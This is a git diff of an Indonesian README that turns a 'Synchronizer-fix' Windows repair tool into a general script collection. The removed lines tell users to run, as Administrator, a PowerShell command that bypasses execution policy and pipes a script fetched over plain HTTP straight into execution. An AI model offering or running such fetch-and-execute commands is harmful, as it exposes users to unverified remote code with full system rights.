@@ -1,37 +1,31 @@
-# Synchronizer-fix
+# Script Collection
 
-Alat perbaikan sinkronisasi sistem otomatis menggunakan skrip PowerShell.
+Kumpulan skrip otomasi, perbaikan sistem, dan alat utilitas lainnya oleh Farras Rayhand.
 
-## Deskripsi
+## Struktur Repositori
 
-Proyek ini bertujuan untuk mempermudah pengguna dalam memperbaiki masalah sinkronisasi pada sistem Windows melalui skrip PowerShell yang dijalankan secara remote. Proyek ini mencakup skrip perbaikan utama dan tutorial berbasis HTML untuk memudahkan pengguna awam.
+Repositori ini diatur sebagai berikut:
 
-## Isi Proyek
+- `/scripts`: Berisi file skrip mentah (PowerShell, Bash, dll).
+- `/web`: Berisi halaman tutorial/antarmuka web untuk setiap skrip.
+- `index.html`: Portal utama untuk mengakses semua tutorial skrip yang tersedia.
 
-- `synchronizer-fix.ps1`: Skrip PowerShell utama yang berisi logika perbaikan.
-- `index.html`: Tutorial interaktif langkah-demi-langkah untuk menjalankan skrip.
+## Daftar Skrip
 
-## Cara Penggunaan
-
-### Metode Cepat (PowerShell)
-
-Buka PowerShell sebagai Administrator dan jalankan perintah berikut:
-
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/synchronizer-fix.ps1 | iex"
-```
-
-### Metode Tutorial (HTML)
-
-1. Buka file `index.html` di browser pilihan Anda (Chrome, Edge, Firefox, dll).
-2. Ikuti panduan visual yang disediakan di halaman tersebut.
-3. Gunakan tombol **Salin** untuk mengambil perintah dan tempelkan ke PowerShell.
-
-## Prasyarat
-
-- Windows 10 atau 11.
-- Hak akses Administrator.
-- Koneksi internet aktif (untuk mengunduh skrip dari remote source).
+### 1. Synchronizer Fix
+Alat perbaikan sinkronisasi sistem otomatis untuk Windows.
+- **Skrip**: `scripts/synchronizer-fix.ps1`
+- **Tutorial**: [web/synchronizer-fix/index.html](web/synchronizer-fix/index.html)
 
 ---
-*Dibuat untuk mempermudah pemeliharaan sistem secara otomatis.*
+
+## Cara Kontribusi
+
+1. Fork repositori ini.
+2. Buat folder baru di `/web/[nama-skrip]` untuk tutorialnya.
+3. Simpan skrip di `/scripts/[nama-skrip]`.
+4. Perbarui `index.html` utama dan `README.md`.
+5. Kirim Pull Request.
+
+---
+*Dibuat untuk mempermudah manajemen skrip pribadi dan berbagi solusi.*
